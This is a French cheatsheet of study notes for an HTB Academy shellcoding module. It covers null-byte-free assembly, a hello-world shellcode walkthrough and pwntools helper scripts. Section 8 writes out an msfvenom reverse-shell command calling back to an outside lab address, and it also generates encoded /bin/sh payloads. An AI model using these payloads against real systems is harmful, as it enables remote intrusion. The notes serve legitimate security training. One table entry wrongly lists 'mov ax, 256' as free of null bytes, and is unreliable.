# Cheatsheet - Shellcoding (HTB Academy - Intro to Assembly Language)

> Prerequis : [intro-to-assembly-language.md](intro-to-assembly-language.md)

---

## 1. Qu'est-ce qu'un Shellcode ?

Un **shellcode** est la representation hexadecimale du code machine executable d'un binaire (section `.text` uniquement). Il est concu pour etre charge directement en memoire et execute par le processeur, sans passer par un fichier executable classique.

### Utilisation en pentest
- **Buffer overflow** : injecter un shellcode (ex: reverse shell) dans la memoire d'un programme vulnerable
- **Injection dans des binaires** : infecter des ELF/DLL/SO pour executer du code au chargement
- **Execution en memoire** : executer du code sans ecrire sur le disque (fileless)
- **ROP (Return Oriented Programming)** : technique moderne pour contourner les protections memoire (NX/DEP), necessite une bonne comprehension de l'assembleur

---

## 2. Assembly vers Machine Code

Chaque instruction x86 et chaque registre a son propre code machine binaire (represente en hex). `nasm` convertit les instructions assembleur en codes machines correspondants.

```bash
# Assembler une instruction en shellcode
pwn asm 'push rax' -c 'amd64'
# Resultat : 50

# Desassembler un shellcode en instructions
pwn disasm '50' -c 'amd64'
# Resultat : 0: 50  push eax
```

### Exemples de codes machines courants

| Instruction | Code machine |
|-------------|-------------|
| `push rax` | `50` |
| `push rbx` | `53` |
| `xor rax, rax` | `48 31 c0` |
| `mov al, 1` | `b0 01` |
| `syscall` | `0f 05` |

---

## 3. Exigences d'un shellcode valide

Un shellcode **doit** respecter 3 regles pour fonctionner correctement une fois charge en memoire :

| Regle | Raison |
|-------|--------|
| **Pas de variables** (pas de `.data` / `.bss`) | Le segment text est non-writable, le segment data est non-executable |
| **Pas d'adresses memoire directes** | Les adresses changent selon l'environnement d'execution |
| **Pas de bytes NULL (`0x00`)** | Les `00` sont des terminateurs de chaine et interrompent le chargement |

### Pourquoi les NULL bytes posent probleme

```bash
# Instruction avec NULL bytes :
pwn asm 'mov rax, 1' -c 'amd64'
# Resultat : 48c7c001000000  (contient des 00 !)

# Instructions equivalentes SANS NULL bytes :
pwn asm 'xor rax, rax' -c 'amd64'
# Resultat : 4831c0
pwn asm 'mov al, 1' -c 'amd64'
# Resultat : b001
```

---

## 4. Techniques de shellcoding

### 4.1 Supprimer les variables

Le code doit etre entierement dans la section `.text`. Pour les chaines, on les pousse sur la stack :

```nasm
; AVANT (avec variable - NE FONCTIONNE PAS en shellcode) :
section .data
    message db "Hello HTB Academy!"
section .text
    mov rsi, message

; APRES (sans variable - shellcode compatible) :
section .text
    xor rbx, rbx
    mov bx, 'y!'           ; 2 bytes -> registre 16-bit
    push rbx
    mov rbx, 'B Academ'    ; 8 bytes -> registre 64-bit
    push rbx
    mov rbx, 'Hello HT'    ; 8 bytes -> registre 64-bit
    push rbx
    mov rsi, rsp            ; rsi pointe vers la chaine sur la stack
```

> **Note** : les chaines sont pushees en ordre **inverse** (la stack est LIFO).
> On n'a pas besoin de null-terminator ici car `write` utilise une longueur explicite.

### 4.2 Supprimer les adresses directes

- Remplacer les `call 0xADDRESS` par des `call label` (nasm convertit en adresses relatives)
- Utiliser l'adressage relatif a `rip` pour les references memoire
- Pour les donnees, utiliser la stack + `rsp` comme pointeur

### 4.3 Supprimer les NULL bytes

La regle : utiliser des **registres de taille adaptee** a la donnee pour eviter le padding avec des `00`.

```nasm
; MAUVAIS (NULL bytes) :             ; BON (pas de NULL) :
mov rax, 1    ; 48c7c001000000       xor rax, rax  ; 4831c0
                                     mov al, 1     ; b001

mov rdi, 1    ; 48c7c701000000       xor rdi, rdi  ; 4831ff
                                     mov dil, 1    ; 40b701

mov rdi, 0    ; 48c7c700000000       xor rdi, rdi  ; 4831ff

mov rax, 60   ; 48c7c03c000000       xor rax, rax  ; 4831c0
                                     mov al, 60    ; b03c
```

> **Astuce** : Pour mettre 0 dans un registre, faire `xor reg, reg`. Pour pusher 0 sur la stack, xor un registre puis le push.

---

## 5. Scripts utilitaires

Tous les scripts sont egalement disponibles prets a l'emploi dans [`tools/`](tools/) ([README](tools/README.md)).

```
 program.s ──► assembler.sh ──► shellcoder.py ──► loader.py ──► assembler.py
  (code ASM)    (compile+run)    (extract sc)     (exec sc)     (sc -> ELF + gdb)
   etape 1        etape 2          etape 3         etape 4        si debug
```

### 5.1 `assembler.sh` - Assembler + linker + executer (etape 1)

```bash
#!/bin/bash
# Usage : ./assembler.sh <fichier.s>

nasm -f elf64 "$1" -o "${1%.s}.o" && \
ld -o "${1%.s}" "${1%.s}.o" && \
rm "${1%.s}.o" && \
echo "[+] Assembled: ${1%.s}" && \
./"${1%.s}"
```

### 5.2 `shellcoder.py` - Extraire le shellcode d'un binaire (etape 2)

```python
#!/usr/bin/python3
# Usage : python3 shellcoder.py <binary>

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())

# Verification des NULL bytes + taille
if [i for i in shellcode if i == 0]:
    print("%d bytes - ATTENTION : Found NULL byte" % len(shellcode))
else:
    print("%d bytes - No NULL bytes" % len(shellcode))
```

### 5.3 `shellcoder.sh` - Alternative sans pwntools (etape 2)

```bash
#!/bin/bash
# Usage : ./shellcoder.sh <binary>

for i in $(objdump -d "$1" | grep "^ " | cut -f2); do echo -n $i; done; echo;
```

### 5.4 `loader.py` - Executer un shellcode en memoire (etape 3)

```python
#!/usr/bin/python3
# Usage : python3 loader.py '<shellcode_hex>'

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
```

### 5.5 `assembler.py` - Shellcode vers ELF pour debug gdb (etape 4)

```python
#!/usr/bin/python3
# Usage : python3 assembler.py '<shellcode_hex>' <output_binary>

import sys, os, stat
from pwn import *

context(os="linux", arch="amd64", log_level="error")

ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
os.chmod(sys.argv[2], stat.S_IEXEC)
print("[+] Built: %s" % sys.argv[2])
```

---

## 6. Exemple complet de bout en bout

### Etape 1 : Ecrire le code assembleur (version naive)

Fichier `helloworld.s` :

```nasm
global _start

section .data
    message db "Hello HTB Academy!"

section .text
_start:
    mov rsi, message
    mov rdi, 1
    mov rdx, 18
    mov rax, 1
    syscall

    mov rax, 60
    mov rdi, 0
    syscall
```

### Etape 2 : Assembler et tester

```bash
$ nasm -f elf64 helloworld.s -o helloworld.o
$ ld -o helloworld helloworld.o
$ ./helloworld
Hello HTB Academy!
```

### Etape 3 : Extraire le shellcode (version naive)

```bash
$ python3 shellcoder.py helloworld
48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05
37 bytes - ATTENTION : Found NULL byte
```

Le shellcode contient des NULL bytes et des references a `.data` : il ne fonctionnera pas en memoire.

### Etape 4 : Verifier en desassemblant

```bash
$ pwn disasm '48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05' -c 'amd64'
   0:    48 be 00 20 40 00 00     movabs rsi,  0x402000    # adresse directe !
   7:    00 00 00                                           # NULL bytes !
   a:    bf 01 00 00 00           mov    edi,  0x1          # NULL bytes !
   f:    ba 12 00 00 00           mov    edx,  0x12         # NULL bytes !
  14:    b8 01 00 00 00           mov    eax,  0x1          # NULL bytes !
  19:    0f 05                    syscall
  1b:    b8 3c 00 00 00           mov    eax,  0x3c         # NULL bytes !
  20:    bf 00 00 00 00           mov    edi,  0x0          # NULL bytes !
  25:    0f 05                    syscall
```

Problemes identifies :
- `0x402000` = adresse directe vers `.data`
- De nombreux `00` = NULL bytes partout

### Etape 5 : Reecrire en version shellcode-compatible

Fichier `helloworld_sc.s` :

```nasm
global _start

section .text
_start:
    ;--- Construire la chaine sur la stack ---
    xor rbx, rbx
    mov bx, 'y!'            ; 2 bytes dans registre 16-bit (pas de padding)
    push rbx
    mov rbx, 'B Academ'     ; 8 bytes dans registre 64-bit
    push rbx
    mov rbx, 'Hello HT'     ; 8 bytes dans registre 64-bit
    push rbx
    mov rsi, rsp             ; rsi = pointeur vers la chaine

    ;--- syscall write(1, rsi, 18) ---
    xor rax, rax
    mov al, 1                ; rax = 1 (write) - registre 8-bit
    xor rdi, rdi
    mov dil, 1               ; rdi = 1 (stdout) - registre 8-bit
    xor rdx, rdx
    mov dl, 18               ; rdx = 18 (longueur) - registre 8-bit
    syscall

    ;--- syscall exit(0) ---
    xor rax, rax
    add al, 60               ; rax = 60 (exit) - registre 8-bit
    xor dil, dil             ; rdi = 0 (code retour)
    syscall
```

### Etape 6 : Assembler et tester la nouvelle version

```bash
$ ./assembler.sh helloworld_sc.s
[+] Assembled: helloworld_sc
Hello HTB Academy!
```

### Etape 7 : Extraire et valider le shellcode

```bash
$ python3 shellcoder.py helloworld_sc
4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b001
4831ff40b7014831d2b2120f054831c0043c4030ff0f05
61 bytes - No NULL bytes
```

Pas de NULL bytes !

### Etape 8 : Executer le shellcode directement en memoire

```bash
$ python3 loader.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05'
Hello HTB Academy!
```

Le shellcode fonctionne !

### Etape 9 : Debugger le shellcode avec gdb

```bash
# Convertir le shellcode en binaire ELF pour gdb
$ python3 assembler.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05' helloworld_dbg

# Debugger
$ gdb -q ./helloworld_dbg
(gdb) b *0x401000          # breakpoint au point d'entree par defaut
(gdb) r
Breakpoint 1, 0x0000000000401000 in ?? ()

# Verifier les registres et la stack apres les push
(gdb) si 7                 # avancer jusqu'apres le dernier push
(gdb) x/s $rsp             # afficher la chaine sur la stack
0x7fffffffe3b8: "Hello HTB Academy!"

(gdb) info registers rsi   # verifier que rsi pointe bien vers la chaine
(gdb) c                    # continuer l'execution
Hello HTB Academy!
```

---

## 7. Shellcraft (pwntools)

Pwntools inclut `shellcraft`, un generateur de shellcodes pre-faits :

```bash
# Lister les shellcodes disponibles pour Linux x86_64
pwn shellcraft -l 'amd64.linux'

# Afficher le code assembleur d'un shellcode /bin/sh
pwn shellcraft amd64.linux.sh

# Executer directement le shellcode
pwn shellcraft amd64.linux.sh -r
```

### Utilisation en Python

```python
from pwn import *

context(os="linux", arch="amd64")

# Generer le shellcode pour execsh
shellcode = shellcraft.sh()
print(shellcode)              # affiche le code ASM

# Assembler et executer
binary = asm(shellcode)
print(binary.hex())           # affiche le shellcode hex
run_shellcode(binary).interactive()
```

---

## 8. Msfvenom

`msfvenom` (Metasploit) permet de generer des shellcodes plus complexes avec encodage :

```bash
# Lister les payloads Linux x64
msfvenom -l payloads | grep 'linux/x64'

# Generer un shellcode exec /bin/sh
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'

# Generer avec encodage XOR (bypass simple)
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'

# Reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f 'hex'

# Formats de sortie utiles
# -f hex     : hex string
# -f raw     : bytes bruts
# -f python  : tableau python
# -f c       : tableau C
# -f elf     : binaire ELF executable
```

---

## 9. Recapitulatif du workflow shellcoding

```
 1. Ecrire le code ASM          vim program.s
         |
 2. Assembler + tester          ./assembler.sh program.s
         |
 3. Extraire le shellcode       python3 shellcoder.py program
         |
 4. Verifier NULL bytes?  -----> OUI : corriger le code ASM (retour etape 1)
         |                        - xor reg, reg au lieu de mov reg, 0
         | NON                    - registres 8/16-bit adaptes
         |                        - pas de .data, pas d'adresses directes
 5. Charger en memoire          python3 loader.py '<shellcode>'
         |
 6. Debugger si besoin          python3 assembler.py '<sc>' prog
                                gdb -q ./prog
                                b *0x401000
```

---

## 10. Shellcodes prets a l'emploi et ressources

Voir le fichier dedie **[shellcodes-reference.md](shellcodes-reference.md)** pour :
- Shellcodes utiles par architecture (x86_64, x86, ARM64, ARM32, Windows)
- Generation automatique (shellcraft, msfvenom)
- Encodage XOR et evasion basique
- Tables de syscalls de reference
- Liens vers des ressources externes (Shell-Storm, Exploit-DB, CTF platforms...)

---

## 11. Aide-memoire : registres et NULL bytes

Pour eviter les NULL bytes, toujours utiliser le **sous-registre adapte** :

| Valeur a charger | MAUVAIS (NULL bytes) | BON (pas de NULL) |
|------------------|---------------------|-------------------|
| 0 | `mov rax, 0` | `xor rax, rax` |
| 1-255 | `mov rax, 1` | `xor rax, rax` + `mov al, 1` |
| 256-65535 | `mov rax, 256` | `xor rax, rax` + `mov ax, 256` |
| Chaine 2 bytes | `mov rbx, 'y!'` | `xor rbx, rbx` + `mov bx, 'y!'` |
| Chaine 8 bytes | OK directement | `mov rbx, 'Hello HT'` (pas de padding) |
| Push 0 sur stack | `push 0` | `xor rax, rax` + `push rax` |

---
